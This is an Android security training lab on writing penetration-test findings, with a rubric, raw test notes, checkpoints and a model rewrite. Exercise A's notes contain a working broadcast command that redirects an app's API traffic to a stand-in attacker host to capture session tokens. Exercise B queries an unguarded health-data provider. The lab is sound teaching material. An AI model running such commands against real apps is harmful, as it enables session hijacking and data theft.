# Lab 03 — Write the finding

> **Objective.** Turn raw observations into finding write-ups a developer can act on and a client
> can fund — and, in the last exercise, take a finding somebody else inflated and argue it **down**
> without losing what was true in it.

**Difficulty:** intermediate to advanced.
**Time:** 2 hours. This is a writing lab; the work is on the page, not on a device.
**Prerequisites:** [Lab 02](lab-02-the-severity-clinic.md),
[chapter 72 §3.9](../README.md#39-reporting-units-what-actually-goes-in-the-table),
[`../examples/finding-writeups-graded.md`](../examples/finding-writeups-graded.md).
No device required.
**You will produce:** four complete write-ups, self-scored against a ten-point rubric.

---

## 0. Why this lab exists

A finding that is technically correct and badly written does not get fixed. That is not a soft
observation about communication; it is the mechanism by which most assessment value is lost.

Three concrete ways a correct finding fails:

| Failure | What the developer does |
|---|---|
| Title names a category | Cannot tell which of eleven similar entries to open, so opens none |
| Severity is inherited from a control | Recognises the lookup, discounts the rating, and discounts every other rating in the report |
| Remediation aims at the instance | Fixes eleven components, ships a twelfth next quarter |

The rubric in this lab is ten binary points. It is short because a long rubric is not used.

---

## 1. The rubric

You will score every write-up against this. One point each, no partial credit.

| # | Criterion | It fails when |
|---|---|---|
| 1 | **Title is a specific claim** | It is a category name — "Insecure Data Storage" |
| 2 | **Attacker position is named** | "An attacker could…" with no position from §3.4 |
| 3 | **Preconditions are stated in the finding** | They live in the methodology section, or nowhere |
| 4 | **Severity is argued, not looked up** | The only justification offered is a control identifier |
| 5 | **Evidence is reproducible by the developer** | "See screenshot", or a tool's output as proof |
| 6 | **Vantage is stated where it matters** | A `adb shell` result presented as an app result |
| 7 | **Impact is specific** | "Sensitive information may be disclosed" |
| 8 | **What was not tested is stated** | An untested consequence written in the indicative mood |
| 9 | **One finding per root cause** | Near-identical entries, or one entry covering two causes |
| 10 | **Remediation is code, aimed at the mechanism** | "Implement proper security controls" |

> **📖 The template.** The section headings themselves — Summary, Threat model, Technical detail,
> Steps to reproduce, Evidence, Impact, Remediation, References — belong to
> [80-Appendix §6](../../80-Appendix/README.md#6-report-templates). Use it. This lab is about
> filling it in, not about designing it.

---

## 2. Exercise A — the straightforward one

### The raw notes

You have this in your working file, and nothing else. Write it up.

```text
2026-08-16 14:20
com.anon.retail  v7.3.0 (versionCode 70300)  from public store listing
manifest: <receiver android:name=".push.CommandReceiver" android:exported="true">
          <intent-filter><action android:name="com.anon.retail.CMD"/></intent-filter>
          no android:permission

smali: CommandReceiver.onReceive reads intent.getStringExtra("cmd")
       switch on value:
         "sync"        -> triggers sync
         "clear_cache" -> deletes cache dir
         "set_endpoint"-> writes getStringExtra("url") into SharedPreferences
                          key "api_base_url"
       api_base_url is read by RetrofitFactory.build() on next app start

tested from attacker app, ZERO permissions, uid 10312:
  am broadcast -a com.anon.retail.CMD --es cmd set_endpoint \
      --es url https://attacker.test/v1
  -> Broadcast completed: result=0
  -> restarted app, confirmed in proxy: all API traffic now to attacker.test
  -> captured session bearer token in first request

NOT tested: whether backend rejects requests from an unexpected origin
device: Pixel 7a, Android 14, unrooted, tested twice
```

### Your task

Write the complete finding. Before you start, decide:

1. Which single sentence is the title?
2. Which attacker position from §3.4?
3. What is the *class* here — is this a broadcast finding, an input-validation finding, or a
   configuration-injection finding? The class you pick determines the remediation you write.

### Checkpoints

Do not read these until you have a draft.

<details>
<summary>Checkpoint 1 — the title</summary>

"Exported BroadcastReceiver" is a category. "Any installed app can permanently redirect the
application's API traffic to a server of its choice" is a claim.

The title should name **the worst thing the attacker can do**, not the mechanism. The mechanism goes
in Technical detail.
</details>

<details>
<summary>Checkpoint 2 — the severity, and the two inputs people miss</summary>

**High** is defensible. The two inputs that carry it:

- **Preconditions:** installation of the attacker's app, and nothing else. No permissions, no user
  interaction, no network position.
- **Persistence.** `set_endpoint` writes to `SharedPreferences`, so the redirection **survives
  restart**. A one-shot redirect would be materially less severe. If your write-up does not mention
  persistence, you have under-argued your own rating.

Not Critical: this reaches *this* user's session, not other users' data.
</details>

<details>
<summary>Checkpoint 3 — the thing that must be in the Impact paragraph</summary>

You captured a session bearer token. Say so explicitly, and say what it authorises. "Traffic could
be intercepted" is criterion 7 failing; "the attacker receives the user's session bearer token in
the first request after restart, authorising all API actions as that user" is passing.
</details>

<details>
<summary>Checkpoint 4 — the untested part</summary>

Your notes say the backend's origin checking was not tested. That belongs in the write-up, in the
indicative mood about what you *did*, and explicitly flagged as untested otherwise. It cuts against
your own severity slightly, which is exactly why it must be there.
</details>

<details>
<summary>Checkpoint 5 — remediation at the mechanism</summary>

Three levels, and a good write-up gives all three in priority order:

1. **The instance:** `android:exported="false"`, or a `signature`-level `android:permission`.
2. **The class:** `set_endpoint` should not exist in a release build. A base URL that any code path
   can rewrite at runtime is the actual defect; the receiver is how it was reached this time.
3. **The mechanism:** why did a debug affordance ship? Build-variant separation, and a release check
   that fails the build on debug-only commands.

A write-up that gives only level 1 leaves the same defect reachable from the next entry point.
</details>

---

## 3. Exercise B — the one where vantage matters

### The raw notes

```text
com.anon.fitness  v3.1.2
manifest: <provider android:name=".sync.HealthProvider"
                    android:authorities="com.anon.fitness.health"
                    android:exported="true"
                    android:writePermission="com.anon.fitness.WRITE_HEALTH"/>
          -- note: NO android:readPermission, NO android:permission
          WRITE_HEALTH declared protectionLevel="signature"

adb shell content query --uri content://com.anon.fitness.health/measurements
  -> Row: 0 _id=1, date=1755300000, weight_kg=78.4, resting_hr=54
  -> Row: 1 ...
  -> 412 rows

device: AVD, Android 15 / API 35, rooted
vantage: adb shell, uid 2000
```

### Your task

Write it up. **The trap is deliberate and it is the entire exercise.**

### Checkpoints

<details>
<summary>Checkpoint 1 — what you actually proved</summary>

You proved that **uid 2000 can read it**. You have not proved an app can.

`com.android.shell` requests 200 permissions, holds 183 at install, and holds **16 runtime
permissions pre-granted `SYSTEM_FIXED`** — measured in [60-ADB](../../60-ADB/README.md). Depending
on the provider's guards and the data involved, one of those may be why the query succeeded.

The rule from [§3.4](../README.md#34-gate-2--is-it-reachable-and-by-whom): **a probe verified from
`adb shell` has not been verified.** It fails silently in both directions.
</details>

<details>
<summary>Checkpoint 2 — the write-permission detail is the interesting one</summary>

The provider declares `writePermission` at `signature` and **no** `readPermission`. That is
read-open by declaration: writes are locked to the app's own signer, reads are not gated at all.

This asymmetry is worth a sentence in the write-up because it tells you what the developer was
thinking — they guarded the operation that felt dangerous and did not consider the read.

It is also the exact bug chapter 72's own sweep had: folding `writePermission` into a single "guard"
field scored this provider as guarded and dropped it, hiding the only authority in the corpus that
returned rows. See [§3.5](../README.md#35-a-corpus-measurement-of-the-largest-finding-class).
</details>

<details>
<summary>Checkpoint 3 — two honest ways to write it</summary>

**If you re-tested from an app uid and it worked** — using
[`../examples/ProviderReachProbe.java`](../examples/ProviderReachProbe.java) or `run-as` — write it
as a **High**, and state the app uid and the empty permission set in Evidence.

**If you could not re-test**, write it as a finding whose *confidence* is qualified, and say so in
one sentence: "Reachability was confirmed from `adb shell` (uid 2000), which holds pre-granted
permissions an ordinary application does not; confirmation from an unprivileged app uid is
outstanding and is recommended before remediation is prioritised."

Both are professional. Presenting the shell result as an app result is not.
</details>

<details>
<summary>Checkpoint 4 — the data type changes the severity conversation</summary>

Weight and resting heart rate are health data. In many jurisdictions that carries specific
regulatory weight, which is a *business* input to severity rather than a technical one — and it is
the sort of thing that belongs in the Impact paragraph rather than being left for the client to
infer.

Say what the data is. Do not say "sensitive information".
</details>

---

## 4. Exercise C — the one that is not a finding

### The raw notes

```text
com.anon.news  v9.0.1
- no root detection, no debugger detection, no integrity check
- Frida attached immediately, all methods hookable
- android:allowBackup absent (targetSdk 34)
- no networkSecurityConfig declared
- 23 "secret-shaped" strings found by scanner:
    18 = sha256/ constants inside OkHttp's CertificatePinner parser
     4 = public Firebase client IDs (restricted by package + signing cert)
     1 = base64 blob decoding to a PNG header
- SharedPreferences contains "last_read_article_id" and a device install UUID
  (file 0600, dir 0700)

engagement threat model: co-installed app, network attacker.
DEVICE OWNER EXPLICITLY OUT OF SCOPE. app is free, ad-supported,
no accounts, no login, no payments.
```

### Your task

**Write the section of the report that covers all of this — as one honest passage, not five
findings.** This is the hardest writing exercise in the chapter, because writing "we looked and
found nothing here" persuasively is much harder than writing a finding.

### Checkpoints

<details>
<summary>Checkpoint 1 — how many findings is this?</summary>

Zero findings. Possibly one Informational note about the absent `dataExtractionRules`, and that is
generous.

Walk them:

- **No root detection** — device owner is out of scope, and there is no entitlement, no account and
  no payment to protect. Class F-12: a platform fact, not an app finding.
- **`allowBackup` absent** — the platform default. The absent-attribute trap. And the app holds an
  article ID and an install UUID, so even a successful backup yields nothing.
- **No `networkSecurityConfig`** — on `targetSdk` 34 the default already excludes user CAs.
- **23 secret-shaped strings** — all 23 adjudicated and rejected. The 18 `sha256/` hits are
  [36-CertificatePinning](../../36-CertificatePinning/README.md)'s documented false positive: the
  constant belongs to OkHttp's own parser, so it matches on every app that links OkHttp.
- **SharedPreferences contents** — requires root; root is out of scope; and the contents are an
  article ID.
</details>

<details>
<summary>Checkpoint 2 — why this passage is valuable, and what it must contain</summary>

The client is paying to know what you looked at. A clean result is a deliverable — but only if it
demonstrates that the looking happened.

The passage must contain:

- **What was tested**, specifically, with the technique named.
- **What was found**, including the counts of adjudicated-and-rejected candidates. "23 candidates
  matched the secret-detection rule; all 23 were adjudicated and rejected, 18 of them a known
  false-positive class in OkHttp's certificate-pinner parser" is the sentence that earns trust.
- **What was not tested**, and why.
- **Why the absent controls are absent-by-design given the threat model** — and the sentence that
  says what would change that. If the client adds accounts or payments, several of these become live.

That last clause is what makes the passage useful rather than merely honest.
</details>

<details>
<summary>Checkpoint 3 — the temptation, named</summary>

The temptation is to write five Informational findings so the report looks substantial. Resist it,
for a reason that is about the client and not about your integrity: **an Informational band full of
platform facts trains the client to skip the Informational band**, and one day something real will
be in it.
</details>

---

## 5. Exercise D — argue it down

Somebody else wrote this. It is in your queue for peer review and it goes out under your team's
name.

> ### CRITICAL — Insufficient Anti-Reversing Controls (MASVS-RESILIENCE)
>
> **CVSS 9.1 (AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)**
>
> The application does not implement any anti-reversing or anti-tampering controls. During testing
> it was possible to decompile the application using jadx, view all business logic in cleartext, and
> attach the Frida instrumentation framework to the running process. Once attached, any method could
> be hooked and any return value modified.
>
> This represents a critical risk. An attacker with these capabilities can:
> - Reverse engineer proprietary business logic
> - Bypass all client-side security controls
> - Modify application behaviour arbitrarily
> - Extract embedded secrets
>
> Additionally, the application was found to be vulnerable to repackaging: the APK was decompiled,
> modified and re-signed with a self-signed certificate, and installed successfully on a test device.
>
> **Remediation:** Implement runtime application self-protection (RASP), including root detection,
> debugger detection, emulator detection, hook detection and integrity verification. Consider a
> commercial application-shielding solution.

The engagement is the Meridian brief from [Lab 02 §1.3](lab-02-the-severity-clinic.md#13-the-engagement):
consumer messaging, **device owner explicitly out of scope**, no in-app purchases, no local
entitlement.

### Your task

Rewrite it. You must **keep everything true** in it — and there is more truth in it than the rating
deserves — while removing everything that is not supportable.

### Checkpoints

<details>
<summary>Checkpoint 1 — inventory the defects first</summary>

Eight, at least:

1. **Critical with no in-scope attacker.** Every capability described requires the device owner, who
   is out of scope. This is class F-12.
2. **CVSS vector does not match the prose.** `PR:N/UI:N` with `S:C` and `C:H/I:H/A:H` describes a
   remote compromise. The scenario needs local access and full device control. A vector that
   contradicts its own narrative is worse than no vector.
3. **Severity inherited from a control.** MASVS-RESILIENCE is cited *as* the justification.
4. **"Bypass all client-side security controls"** — which controls? If the app has none, there is
   nothing to bypass; if it has some, name them and show the bypass.
5. **"Extract embedded secrets"** — asserted, not demonstrated. If secrets were found, that is a
   different and better finding with its own evidence.
6. **Two findings in one entry.** Reversibility and repackaging are different causes with different
   remediations. Criterion 9.
7. **Repackaging claim is under-evidenced.** "Installed successfully on a test device" is not the
   finding — the finding would be that a repackaged build *functions* against production
   infrastructure. And note that a `classes.dex` CRC check would not catch it: re-signing changes
   the signature digest while the DEX CRC stays identical, because nothing in the code changed
   ([38-TamperDetection](../../38-TamperDetection/README.md)).
8. **Remediation recommends a purchase** before establishing that anything needs protecting. This is
   precisely what [71-OWASP-Mobile](../../71-OWASP-Mobile/README.md) calls out: resilience
   recommended without a named adversary is the most expensive bad advice in mobile security.
</details>

<details>
<summary>Checkpoint 2 — what is true and must survive</summary>

- The app genuinely has no resilience controls. That is a fact.
- It genuinely decompiles and hooks without resistance.
- A repackaged build genuinely installed.

The correct home for all three is an **Informational** note that records the observation, states
plainly that no in-scope attacker benefits, and — the useful part — names the conditions under which
the client should revisit it: if Meridian later enforces a subscription client-side, adds in-app
purchases, or acquires an anti-fraud requirement, this moves into scope and should be re-assessed.

That forward-looking sentence is the thing the original was groping towards, and it is worth more
than the Critical.
</details>

<details>
<summary>Checkpoint 3 — the conversation, not just the edit</summary>

You also have to tell a colleague their Critical is an Informational. The argument that works is not
"you over-rated it" but the four inputs: *who is the attacker, are they in scope, what do they gain,
how many users?* Walk those four and the rating moves itself.

The argument that does not work is quoting a standard at them, because that is the same
inherit-from-the-framework move that produced the Critical.
</details>

<details>
<summary>Checkpoint 4 — a model rewrite</summary>

> **INFO-02 — No client-side resilience controls are present; no in-scope attacker benefits today**
>
> **Severity: Informational.** **Confidence: Demonstrated.**
>
> **Summary.** Meridian implements no root detection, debugger detection, integrity verification or
> anti-hooking. The application decompiles cleanly, accepts a Frida attach without resistance, and a
> repackaged, self-signed build installs and runs on a test device.
>
> **Why this is Informational.** Every capability above requires control of the device, and the
> agreed threat model **excludes the device owner as an adversary**. Meridian sells nothing in-app,
> enforces no entitlement on the client, and has no anti-fraud requirement, so there is no asset on
> the device that these controls would protect. No in-scope attacker — a co-installed application, a
> network attacker, or a person with brief physical access to an unlocked device — gains anything
> from their absence.
>
> **What was demonstrated.** Decompilation with jadx 1.4.7 (2,104 methods were refused and are
> excluded from any completeness claim); Frida 16.x attach and method hooking on a rooted test
> device; APK re-signed with a self-signed certificate and installed via `pm install`. The
> repackaged build was **not** exercised against production infrastructure, so whether the backend
> accepts a differently-signed client is untested.
>
> **When to revisit.** This should be re-assessed if any of the following changes: an entitlement or
> subscription is enforced client-side; in-app purchases are added; an anti-fraud or licensing
> requirement is introduced; or the client's threat model comes to include the device owner. At that
> point the correct first step is to move the enforcement server-side, and only then to consider
> client-side controls — which raise attacker cost and enable detection, and do not stop a
> determined attacker.
>
> **No remediation is recommended at this time.**

That last line is a real sentence that belongs in real reports, and almost nobody writes it.
</details>

---

## 6. Self-scoring

Score each of your four write-ups out of ten. Then:

| Total /40 | Reading |
|---|---|
| 34–40 | Report-ready. |
| 26–33 | Good technical content, leaking value in the write-up. Look at which criteria you lost twice. |
| 16–25 | You are describing observations rather than arguing findings. Re-do Exercise A against the checkpoints. |
| < 16 | Work through [`../examples/finding-writeups-graded.md`](../examples/finding-writeups-graded.md) line by line first. |

**The two criteria most people lose** are 6 (vantage) and 8 (what was not tested), because both
require admitting a limit in a document whose purpose feels like demonstrating competence. They are
the two that most increase how much a client trusts the rest of it.

---

## Success criteria

1. Four complete write-ups using the [80-Appendix §6](../../80-Appendix/README.md#6-report-templates)
   template.
2. Exercise A names persistence as a severity input.
3. Exercise B either re-tests from an app uid or explicitly qualifies its confidence — and does not
   present a shell result as an app result.
4. Exercise C is a passage, not a set of padded Informationals, and states what would change the
   conclusion.
5. Exercise D is rewritten to Informational, keeps all three true observations, and contains a
   "when to revisit" clause.
6. You scored 26 or better.

---

## What comes next

[Lab 04 — CTF: the peer review](lab-04-ctf-the-peer-review.md) hands you a whole draft report with
ten defects planted in it. Every defect is one of the criteria above, failing.
